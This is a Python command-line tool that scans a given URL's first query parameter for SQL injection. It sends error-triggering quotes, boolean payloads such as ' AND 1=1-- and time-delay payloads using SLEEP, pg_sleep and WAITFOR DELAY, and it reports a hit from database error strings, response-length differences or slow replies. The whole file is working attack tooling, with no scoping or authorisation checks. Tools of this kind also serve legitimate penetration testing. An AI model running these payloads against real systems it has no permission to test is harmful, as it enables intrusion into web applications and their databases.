import requests
import argparse
import sys
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse

# ANSI color codes for prettier output
GREEN = '\033[92m'
YELLOW = '\033[93m'
RED = '\033[91m'
RESET = '\033[0m'

def scan_error_based(url, param):
    """Scans for error-based SQL injection."""
    print(f"{YELLOW}[*] Testing for Error-Based SQLi on parameter: {param}{RESET}")

    # Payloads that might trigger a database error
    error_payloads = ["'", "\"", "')"]
    # Common error messages from different database systems
    error_messages = [
        "you have an error in your sql syntax",
        "unclosed quotation mark",
        "odbc microsoft access driver",
        "invalid input syntax for type",
        "oracle jdbc driver",
        "sql command not properly ended"
    ]

    parts = urlparse(url)
    query_dict = parse_qs(parts.query)

    for payload in error_payloads:
        # Inject payload into the parameter
        query_dict[param] = payload
        new_query = urlencode(query_dict, doseq=True)
        test_url = urlunparse(parts._replace(query=new_query))

        try:
            res = requests.get(test_url, timeout=10)
            for message in error_messages:
                if message in res.text.lower():
                    print(f"{GREEN}[+] Vulnerable to Error-Based SQLi!{RESET}")
                    print(f"  URL: {test_url}")
                    print(f"  Detected error: '{message}'")
                    return True # Vulnerability found
        except requests.RequestException as e:
            print(f"{RED}[-] Error during request: {e}{RESET}")
            continue
            
    print(f"{RED}[-] Not vulnerable to Error-Based SQLi.{RESET}")
    return False

def scan_boolean_based(url, param):
    """Scans for boolean-based blind SQL injection."""
    print(f"{YELLOW}[*] Testing for Boolean-Based Blind SQLi on parameter: {param}{RESET}")

    parts = urlparse(url)
    query_dict = parse_qs(parts.query)
    original_value = query_dict.get(param, [''])[0]

    # Payloads for True/False conditions
    payload_true = f"{original_value}' AND 1=1--"
    payload_false = f"{original_value}' AND 1=2--"

    try:
        # 1. Get original response
        original_res = requests.get(url, timeout=10)

        # 2. Test TRUE condition
        query_dict[param] = payload_true
        true_query = urlencode(query_dict, doseq=True)
        true_url = urlunparse(parts._replace(query=true_query))
        true_res = requests.get(true_url, timeout=10)

        # 3. Test FALSE condition
        query_dict[param] = payload_false
        false_query = urlencode(query_dict, doseq=True)
        false_url = urlunparse(parts._replace(query=false_query))
        false_res = requests.get(false_url, timeout=10)

        # 4. Compare lengths
        if len(original_res.text) == len(true_res.text) and len(original_res.text) != len(false_res.text):
            print(f"{GREEN}[+] Vulnerable to Boolean-Based Blind SQLi!{RESET}")
            print(f"  TRUE Payload: {true_url}")
            print(f"  FALSE Payload: {false_url}")
            return True

    except requests.RequestException as e:
        print(f"{RED}[-] Error during request: {e}{RESET}")

    print(f"{RED}[-] Not vulnerable to Boolean-Based Blind SQLi.{RESET}")
    return False

def scan_time_based(url, param):
    """Scans for time-based blind SQL injection."""
    print(f"{YELLOW}[*] Testing for Time-Based Blind SQLi on parameter: {param}{RESET}")
    
    # Payloads for different DBs to cause a 5-second delay
    time_payloads = [
        "' AND SLEEP(5)--",        # MySQL, MariaDB
        "' AND pg_sleep(5)--",      # PostgreSQL
        "'; WAITFOR DELAY '0:0:5'--" # SQL Server
    ]
    
    delay = 5  # seconds

    parts = urlparse(url)
    query_dict = parse_qs(parts.query)

    for payload in time_payloads:
        print(f"    {YELLOW}--> Trying payload: {payload}{RESET}")
        query_dict[param] = payload
        new_query = urlencode(query_dict, doseq=True)
        test_url = urlunparse(parts._replace(query=new_query))

        try:
            res = requests.get(test_url, timeout=15)
            # Check if response time is greater than our delay
            if res.elapsed.total_seconds() >= delay:
                print(f"{GREEN}[+] Vulnerable to Time-Based Blind SQLi!{RESET}")
                print(f"  Payload used: {payload}")
                print(f"  Response time: {res.elapsed.total_seconds():.2f}s")
                return True
        except requests.RequestException:
            # Timeouts are expected here, but we check the elapsed time
            pass 

    print(f"{RED}[-] Not vulnerable to Time-Based Blind SQLi.{RESET}")
    return False

def main():
    parser = argparse.ArgumentParser(description="A simple SQL Injection scanner.")
    parser.add_argument("-u", "--url", required=True, help="Full URL to test (e.g., 'http://test.com/index.php?id=1')")
    args = parser.parse_args()

    # Extract the first parameter from the URL to test
    parsed_url = urlparse(args.url)
    if not parsed_url.query:
        print(f"{RED}URL has no query parameters to test. Exiting.{RESET}")
        sys.exit(1)
        
    param_to_test = list(parse_qs(parsed_url.query).keys())[0]

    print(f"\n{YELLOW}--- Starting Scan on {args.url} ---{RESET}")
    
    # Run the scanners in order
    if not scan_error_based(args.url, param_to_test):
        if not scan_boolean_based(args.url, param_to_test):
            scan_time_based(args.url, param_to_test)

    print(f"{YELLOW}--- Scan Finished ---{RESET}\n")

if __name__ == "__main__":
    main()